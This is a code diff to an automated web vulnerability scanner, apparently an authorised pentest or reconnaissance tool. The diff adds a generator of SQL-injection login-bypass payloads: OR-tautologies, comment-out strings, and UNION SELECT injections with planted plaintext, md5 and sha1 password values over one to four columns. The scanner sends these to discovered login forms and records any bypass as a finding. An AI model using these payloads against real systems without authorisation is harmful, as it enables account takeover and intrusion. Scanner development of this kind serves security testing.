@@ -683,7 +683,7 @@ def stage_params(live):
     feed(f"{len(params)} unique parameters discovered", "good")
 
 # ---------------- active vulnerability testing (urllib, no external deps) ----------------
-import urllib.request, urllib.parse, urllib.error, ssl, re as _re, random, difflib
+import urllib.request, urllib.parse, urllib.error, ssl, re as _re, random, difflib, hashlib
 _CTX = ssl.create_default_context(); _CTX.check_hostname = False; _CTX.verify_mode = ssl.CERT_NONE
 class _NR(urllib.request.HTTPRedirectHandler):
     def redirect_request(self, *a, **k): return None
@@ -807,6 +807,24 @@ def _sim(a, b):
     a = (a or b"")[:3000]; b = (b or b"")[:3000]
     if not a and not b: return 1.0
     return difflib.SequenceMatcher(None, a, b).ratio()
+
+_AB_PW = "r3c0nByp7"
+def _authbypass_payloads():
+    """Login-bypass payloads: OR-tautologies AND UNION-SELECT injections that return a
+    controlled credential so the app's own password check passes — covers the
+    `' UNION SELECT '<md5(pw)>'-- -` + submit <pw> technique across plain/md5/sha1 and
+    1..4 columns (column count/hash algo are unknown up front, so we sweep them)."""
+    hv = {"plaintext": _AB_PW,
+          "md5": hashlib.md5(_AB_PW.encode()).hexdigest(),
+          "sha1": hashlib.sha1(_AB_PW.encode()).hexdigest()}
+    pl = [("' OR '1'='1'-- -", "x", "OR-tautology"), ("admin'-- -", "x", "comment-out"),
+          ("' OR 1=1-- -", "x", "OR-tautology"), ("admin' OR '1'='1'#", "x", "OR-tautology")]
+    for algo, v in hv.items():
+        for nc in range(1, 5):
+            cols = ",".join([f"'{v}'"] + [str(i) for i in range(2, nc + 1)])
+            u = f"no{random.randint(100,999)}user' UNION SELECT {cols}-- -"
+            pl.append((u, _AB_PW, f"UNION/{algo}/{nc}col"))
+    return pl
 
 def _login_succeeded(fail, ok):
     """Heuristic: did an injection flip a failed login into an authenticated state?"""
@@ -1102,10 +1120,10 @@ def form_recon(page_url, host):
                 return _post(action, data) if is_post else _get(action + "?" + urllib.parse.urlencode(data), timeout=12)
             fail = submit(f"recon_nouser_{random.randint(1000,9999)}", "recon_nopass_x")
             if fail:
-                for uval in ("' OR '1'='1'-- -", "admin'-- -", "' OR 1=1-- -", "' OR '1'='1"):
-                    ok = submit(uval, "x")
+                for uval, pval, tag in _authbypass_payloads():
+                    ok = submit(uval, pval)
                     if ok and _login_succeeded(fail, ok):
-                        finding("crit", "auth-bypass", host, f"‼ authentication bypass via login field '{uf}' → {action}", action)
+                        finding("crit", "auth-bypass", host, f"‼ authentication bypass ({tag}) via login field '{uf}' → {action}", action)
                         break
 
 ERR_SIGS = [b"sql syntax", b"mysql_", b"ora-0", b"odbc", b"sqlite", b"psql", b"syntax error",
